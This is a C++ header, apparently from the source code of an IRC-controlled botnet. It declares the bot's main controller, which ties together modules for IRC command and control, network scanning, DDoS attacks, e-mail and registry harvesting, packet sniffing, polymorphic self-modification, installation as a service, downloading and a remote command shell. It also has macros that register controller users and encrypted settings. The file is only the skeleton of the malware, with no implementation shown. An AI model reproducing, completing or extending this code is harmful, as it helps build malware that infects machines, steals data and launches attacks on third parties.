
#ifndef __MAINCTRL_H__
#define __MAINCTRL_H__

#include "cmdline.h"
#include "cstring.h"
#include "consdbg.h"
#include "random.h"
#include "sockets.h"
#include "utility.h"
#include "cmdshell.h"
#include "cvar.h"
#include "bot.h"
#include "commands.h"
#include "mac.h"
#include "installer.h"
#include "scanner.h"
#include "irc.h"
#include "ddos.h"
#include "redirect.h"
#include "harvest_emails.h"
#include "harvest_registry.h"
#include "polymorph.h"
#include "logic.h"
#include "sniffer.h"
#include "cplugin.h"
#include "sdcompat.h"
#include "skythread.h"

#ifdef WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow);
#else
int main(int argc, char **argv);
#endif

//#define while(x) while(((x) && (g_pMainCtrl ? g_pMainCtrl->m_bRunning : true)))
// Params: a=var, b=cmd, c=description, d=fallback, e=handler class
#define REGCMD(a, b, c, d, e) g_pMainCtrl->m_cCommands.RegisterCommand(&a, b, c, d, e);
// Params: a=var/name, b=default, c=description, d=save, e=encrypted, f=key
#define REGCVAR(a, b, c, d, e, f) g_pMainCtrl->m_cCVar.RegisterCvar(&a, #a, b, c, d, e, f);
// Params: a=server struct
#define REGSERVER(a) g_pMainCtrl->m_cIRC.m_vServers.push_back(&a);
// Params: a=user, b=md5, c=netmask, d=identd
#define ADDUSER(a, b, c, d) g_pMainCtrl->m_cMac.AddUser(a, b, c, d);

class CMainCtrl
{
public:
						 CMainCtrl();
	virtual				~CMainCtrl();
	int					 Main(const char *szCmdLine, const char *szArgv0);
	int					 MainCtrl();

	CCommands			 m_cCommands;
	CCmdLine			 m_cCmdLine;
	CConsDbg			 m_cConsDbg;
	CBot				 m_cBot;
	CMac				 m_cMac;
	CCVar				 m_cCVar;
	CInstaller			 m_cInstaller;
	CDownloader			 m_cDownloader;
	CScanner			 m_cScanner;
	CIRC				 m_cIRC;
	CSendFile			 m_cSendFile;
	CSendFileFTP		 m_cSendFileFTP;
	CIdentD				 m_cIdentD;
	CDDOS				 m_cDDOS;
	CsdbotCompat		 m_SdCompat;
	CRedirect			 m_cRedirect;
	CHarvest_EMails		 m_cHarvest_EMails;
	CHarvest_Registry    m_cHarvest_Registry;
	CRSLControl			 m_cRSLControl;
#ifdef _WIN32
	CService			 m_cService;
#endif // _WIN32
	CProcessControl		 m_cProcessControl;
	CPolymorph			 m_cPolymorph;
	CLogic				 m_cLogic;
	CSniffer			 m_cSniffer;
	CPluginLoader		 m_cPluginLoader;
	CStartupThread		 m_cStartupThread;
#ifdef _WIN32
	CCmdShell			 m_cCmdShell;
#endif // WIN32

	bool				 m_bRunning;
	CString				 m_sUserName;
	CString				 m_sTmpSvcName;
	CString				 m_sNameVerStr;
	CString				 m_sArgv0;
	CString				 m_sCmdLine;
	bool				 m_bIdentD_Running;
};

extern CMainCtrl *g_pMainCtrl;
extern CCleanupThread *g_pCleanupThread;

#endif // __MAINCTRL_H__
